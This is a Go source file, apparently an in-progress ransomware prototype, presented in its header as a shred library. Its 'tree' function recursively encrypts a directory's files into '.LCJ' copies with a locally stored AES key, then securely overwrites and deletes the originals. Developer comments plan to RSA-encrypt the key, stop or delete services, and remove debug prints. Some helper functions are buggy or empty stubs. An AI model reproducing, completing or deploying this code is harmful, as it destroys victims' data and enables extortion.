// Package shred is a golang library to mimic the functionality of the linux shred command
package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// lisandro : change the encryption swipe time from 3 to 2 ? (1?)

// encrypt the key file with RSA public key after creating the key file 

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

)

func init() {
	 //rand.Seed not working
	 //rand.Seed(time.Now().UnixNano())
}

// ========= GENERAL =========
func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}
// ========= END GENERAL =========
// ========= SHRED =========

// Conf is a object containing all choices of the user
type Conf struct {
	Times  int
	Zeros  bool
	Remove bool
}


// Path shreds all files in the location of path
// recursively. If remove is set to true files will be deleted
// after shredding. When a file is shredded its content
// is NOT recoverable so USE WITH CAUTION!!!

func (conf Conf) Path(path string) error {
	stats, err := os.Stat(path)
	Error(err)

	if stats.IsDir() {
		return conf.Dir(path)
	}

	return conf.File(path)
}

// Dir overwrites every File in the location of path and everything in its subdirectories
func (conf Conf) Dir(path string) error {
	var chErrors []chan error

	walkFn := func(path string, info os.FileInfo, err error) error {
		Error(err)

		if info.IsDir() {
			return nil
		}

		chErr := make(chan error)
		chErrors = append(chErrors, chErr)
		go func() {
			err := conf.File(path)
			chErr <- err
		}()

		return nil
	}

	if err := filepath.Walk(path, walkFn); err != nil {
		return err
	}

	for _, chErr := range chErrors {
		if err := <-chErr; err != nil {
			return err
		}
	}

	return nil
}

// File overwrites a given File in the location of path
func (conf Conf) File(path string) error {
	for i := 0; i < conf.Times; i++ {
		if err := overwriteFile(path, true); err != nil {
			return err
		}
	}

	if conf.Zeros {
		if err := overwriteFile(path, false); err != nil {
			return err
		}
	}

	if conf.Remove {
		var err = os.Remove(path)
		if err!=nil { return err }
	}

	return nil
}

func overwriteFile(path string, random bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	defer f.Close()

	info, err := f.Stat()
	Error(err)

	buff := make([]byte, info.Size())
	if random {
		if _, err := rand.Read(buff); err != nil {
			return err
		}
	}

	_, err = f.WriteAt(buff, 0)
	return err
}

// ========= END SHRED =========

// ========= ENCRYPT =========
var key []byte
func rand_str(str_size int) string {
	alphanum := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&'()[]{}*+-_!?.,;:"
	var bytes = make([]byte, str_size)
	rand.Read(bytes)
	for i, b := range bytes {
		bytes[i] = alphanum[b%byte(len(alphanum))]
	}
	return string(bytes)
}

func createPrivKey() []byte {
	newkey := []byte(rand_str(32))
	err := ioutil.WriteFile("key", newkey, 0644)
	if err != nil {
		fmt.Printf("Error creating Key file!")
		os.Exit(0)
	}
	return newkey
}

func checkKey() {
	thekey, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		key = createPrivKey() //If not, create one
	} else {
		key = thekey //If so, set key as the key found in the file
	}
}

func encryptFile(inputfile string, outputfile string) {
	b, err := ioutil.ReadFile(inputfile) //Read the target file
	Error(err)
	ciphertext := encrypt(key, b)
	//fmt.Printf("%x\n", ciphertext)
	err = ioutil.WriteFile(outputfile, ciphertext, 0644)
	if err != nil {
		fmt.Printf("Unable to create encrypted file!\n")
		os.Exit(0)
	}
}

func decryptFile(inputfile string, outputfile string) {
	z, err := ioutil.ReadFile(inputfile)
	result := decrypt(key, z)
	err = ioutil.WriteFile(outputfile, result, 0755)
	if err != nil { //19111999 : we don't want this
		fmt.Printf("Unable to create decrypted file!\n")
		os.Exit(0)
	}
}

func encodeBase64(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func decodeBase64(b []byte) []byte {
	data, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		fmt.Printf("Error: Bad Key!\n")
		os.Exit(0)
	}
	return data
}

func encrypt(key, text []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	b := encodeBase64(text)
	ciphertext := make([]byte, aes.BlockSize+len(b))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(ciphertext[aes.BlockSize:], b)
	return ciphertext
}

func decrypt(key, text []byte) []byte {
	block, err := aes.NewCipher(key)
	Error(err)
	if len(text) < aes.BlockSize {
		fmt.Printf("Error!\n")
		os.Exit(0)
	}
	iv := text[:aes.BlockSize]
	text = text[aes.BlockSize:]
	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(text, text)
	return decodeBase64(text)
}

// ========= END ENCRYPT =========

func listdir(path string)([]string){
	searchDir := path
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return err
	})

	if e != nil {
		panic(e)
	}
	return fileList;
}

func remove_to_index(s []string, index int) []string {
	return append(s[index:len(s)], s[len(s):]...)
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		fmt.Println(err)
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

func file_to_byte(file string)(int64){
	fi, err := os.Stat(file)
	Error(err)
	return fi.Size()
}

func byte_to_mega(file int64)(float64){
	var file_size float64 = float64((file / 1024) / 1024)
	return file_size
}

func is_windows(file string)(){
	s := strings.Split(file, "/")
	if (s[len(s)-1] == "Windows"){
		fileList := listdir(file)
		for _, f := range fileList {
			s1 := strings.Split(f, "/")
			if (s1[len(s)-1] == "System32"){

			}
		}
	} else{
		return;
	}
	//fmt.Println(s[len(s)-1])
}

func pass()(){
	_ = ""
}

func tree(path string, encrypt bool)(){
	fileList := listdir(path)

	shredconf := Conf{Times: 2, Zeros: true, Remove: true}
	start := time.Now()
	for i := 1; i <= 3; i++ { // edode : 50 150 and the left ones
		var max_size float64
		for _, file := range fileList {
			if is_dir(file){
				fileList = remove_to_index(fileList, 1)
				continue
			}
			if encrypt{
				if file[len(file)-4:] == ".LCJ"{
					continue
				}
			} else {
				if file[len(file)-4:] != ".LCJ"{
					continue
				}
			}
			if i == 1{
				max_size = 50
			} else if i == 2{
				max_size = 150
			} else if i == 3{
				max_size = 9999999999
			}

			if !is_dir(file) {
				if encrypt{
					file_byte := file_to_byte(file)
					size := byte_to_mega(file_byte)
					if size <= max_size {
						encryptFile(file, file+".LCJ")
						shredconf.Path(file)
						fileList = remove_to_index(fileList, 1)
					} else {
						continue
					}
				}
				if !encrypt {
					decryptFile(file, file[:len(file)-4])
					shredconf.Path(file)
					fileList = remove_to_index(fileList, 1)
				}
			}
		}
	}
	elapsed := time.Since(start)
	log.Printf("SECOND ELAPSED : %s", elapsed)
}

func main() {
	checkKey()
	fmt.Println("Hello")
	//path := "/root/Desktop/Save_blue_WD/"
	//tree(path, true)
	//tree(path, false)
}























